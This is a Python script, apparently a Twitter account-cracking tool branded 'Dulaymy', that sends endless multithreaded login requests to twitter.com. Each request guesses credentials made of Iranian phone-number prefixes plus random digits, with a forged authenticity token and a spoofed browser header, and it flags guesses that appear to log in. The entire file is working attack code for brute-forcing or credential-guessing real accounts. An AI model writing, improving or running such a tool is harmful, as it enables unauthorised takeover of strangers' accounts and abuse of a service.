import requests
import random 
import threading
#import json
#import time
#from bs4 import BeautifulSoup
import pyfiglet



# = = = = = = = = = = = = 
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
G = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
# = = = = = = = = = = = =
threds= int(input("Threading :"))




logo = pyfiglet.figlet_format('Dulaymy')
print(B+logo)
print(G+'* '*15)


Words = ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm']
token = (random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words))
ct0 = ''
auth_token = ''
#tweets = open('list.txt', 'r', encoding='utf-8')

		

times =5 # int(input("Tweet every (Seconds) : "))
updatecook =50 #int(input("cookies update  after ( ? ) tweets : "))


def login(use,pas):
	a=str(random.randint(10000000,100000000))
	use=use+a
	pas=pas+a
	session = requests.Session()
	url = "https://twitter.com/sessions"
	session.headers = {
	"Host": "twitter.com",
	"Content-Type": "application/x-www-form-urlencoded",
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
	}
	cookies = {
	"_mb_tk":token
	}
	data = {
	"authenticity_token":token,
	"session[username_or_email]":use,
	"session[password]":pas
	}
	response = session.post(url, data=data , cookies=cookies)
	r = session.cookies.get_dict()
	try:
		if r['dnt'] :
			print(G+use)
	except:
			print(R+use)
			
			


while True:
	use ='+9891'
	pas ='091'
	threads = []
	for i in range(threds):
		thread1= threading.Thread(target=login,args=(use,pas,))
		thread1.start()
		threads.append(thread1)
	for thread2 in threads:
		thread2.join()
